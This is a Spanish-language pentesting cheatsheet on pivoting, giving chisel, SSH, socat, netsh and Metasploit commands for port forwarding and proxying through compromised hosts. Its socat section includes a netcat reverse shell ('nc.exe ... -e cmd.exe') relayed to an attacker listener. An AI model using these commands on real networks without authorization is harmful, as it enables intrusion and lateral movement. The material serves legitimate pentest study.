---
title: "Pivoting"
draft: false
images: []
description: "Pivoting cheatsheet with chisel, socat and metasploit"
lead: "Pivoting cheatsheet with chisel, socat and metasploit"
menu:
  docs:
    parent: "Privesc"
weight: 100
toc: true
---


## <span style="color:#208355"> Port Forwarding </span>

Se crea una conexión entre un puerto local y un solo puerto en un objetivo, a través de un host comprometido. Esta técnica tiende a ser más rápida y más confiable que el proxy, pero solo nos permite acceder a un solo puerto (o un pequeño rango) en un solo dispositivo de destino. 

### <span style="color:#208355">Chisel Port Forwarding</span>

**Kali Machine** - 192.168.100.118
```bash
chisel server --reverse -p 1234
```

* reverse: permite a los clientes establecer conexiones reverse tunneling
* p: puerto de escucha http

**Ubuntu Machine** - 192.168.100.135/10.0.0.2
```bash
chisel client 192.168.100.118:1234 R:127.0.0.1:80:10.0.0.3:80
```

* R: \<local-interface\>:\<local-port\>:\<remote-host\>:\<remote-port\>


### <span style="color:#208355">Metasploit Portfwd</span>

In a meterpreter session

```bash
portfwd add -l 1234 -p 3389 -r 10.10.10.10
```
* l: puerto de escucha local
* p: puerto remoto a conectarse
* r: host remoto a conectarse
---

## <span style="color:#208355">Proxying/Tunneling</span>

Cuando hablamos de proxy, creamos una conexión a través de una máquina comprometida para enrutar todo el tráfico deseado a la red de destino. Un proxy es útil si deseamos redirigir mucho tráfico a nuestra red de destino, por ejemplo, un escaneo NMAP o para acceder a múltiples puertos en múltiples máquinas diferentes.

### <span style="color:#208355">Chisel Socks Proxy</span>

**Kali Machine** - 192.168.100.118
```bash
chisel server --reverse -p 1234
```

* reverse: permite a los clientes establecer conexiones reverse tunneling
* p: puerto de escucha http

**Ubuntu Machine** - 192.168.100.135/10.0.0.2
```bash
chisel client 192.168.100.118:1234 R:socks
```

### <span style="color:#208355">SSH Port Dynamic Forwarding</span>

**Kali Machine** - 192.168.100.118
```bash
ssh kryot@10.0.0.2 -D 1337
```
* D: puerto dinámico local

**Burpsuite** 
```bash
Configure User Options - SOCKS Proxy
Host 127.0.0.1
Port 1337
```
**Proxychains**
```bash
nano /etc/proxychains.conf
```

### <span style="color:#208355">SOCAT Tunneling</span>

**Kali Machine** - 192.168.100.118
```bash
nc -lvnp 7878
```
**Ubuntu Machine** - 192.168.100.135/10.0.0.2
```bash
socat TCP-LISTEN:7777,reuseaddr,fork tcp:192.168.100.118:7878
```
* TCP-LISTEN: establece puerto en escucha
* reuseaddr: permite reutilizar el puerto después de la finalización del programa
* fork: indicamos que socat pueda aceptar más de una conexión.

**Windows Machine** - 10.0.0.3
```bash
nc.exe 10.0.0.2 7777 -e cmd.exe
```

### <span style="color:#208355">Windows Proxying</span>

```bash
netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=9999 connectaddress=10.90.60.80
```

### <span style="color:#208355">Metasploit Autoroute</span>

In a meterpreter session

```bash
run autoroute -s 10.0.0.3 -n 255.255.255.0
```
* s: host
* n: máscara de red - default 255.255.255.0
